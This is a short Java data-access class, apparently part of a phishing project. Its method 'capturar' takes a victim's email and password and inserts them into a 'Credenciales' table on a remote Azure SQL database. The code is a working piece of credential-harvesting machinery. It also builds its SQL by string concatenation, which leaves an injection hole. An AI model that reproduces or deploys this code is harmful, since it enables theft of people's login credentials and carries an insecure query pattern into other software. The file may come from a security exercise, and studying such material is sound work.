package modelo;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.SQLWarning;
import java.sql.Statement;
import java.sql.Types;

import java.util.ArrayList;

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author Sergio
 */
public class daoPhishing {
      //Data Access Object
    private Connection conexion;
    
    
             //abre la conexon de SQL
  private void abrirConexion()throws SQLException, ClassNotFoundException{
        
        Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");
       // String dbURI = "jdbc:sqlserver://localhost:1433;databaseName=PruebasBD";
        //solo se quito la contraseña por seguridad
        String dbURI = "jdbc:sqlserver://team4-sbd.database.windows.net:1433;database=pruebasBD;user=usuarioPruebas@team4-sbd;password={some_password}encrypt=true;trustServerCertificate=false;hostNameInCertificate=*.database.windows.net;loginTimeout=30;";
  
         conexion = DriverManager.getConnection(dbURI);
  }//fin de abrirConexion()
  
    
   private void cerrarConexion() throws SQLException{
         conexion.close(); 
     }//fin de cerrarConexion()
     
   //insertaComentarios
   public void capturar(UsuarioPOJO cmPOJO)throws SQLException, ClassNotFoundException{//agrega o inserta una credencial a la tabla   
       abrirConexion(); 
          // instrucciones que se mandaran al SQL                <obtiene el nombre>          <obtiene el comentario>
          //y clase que son del parametro                             ^^^^^^ ^^^                       ^^^ ^^^ ^^^
       String mensajeSQL = "insert into Credenciales values('" +  cmPOJO.getCorreo()  +"','" + cmPOJO.getContrasena() +"')";
       Statement stmt = conexion.createStatement(); 
       stmt.executeUpdate(mensajeSQL);//manda las instrucciones al SQL de la cadena almacenada en mensajeSQL
       cerrarConexion();//cierra la conexion despues de mandar la instrucciones 
   
  }// fin de cerrarConexion()
   
  
}
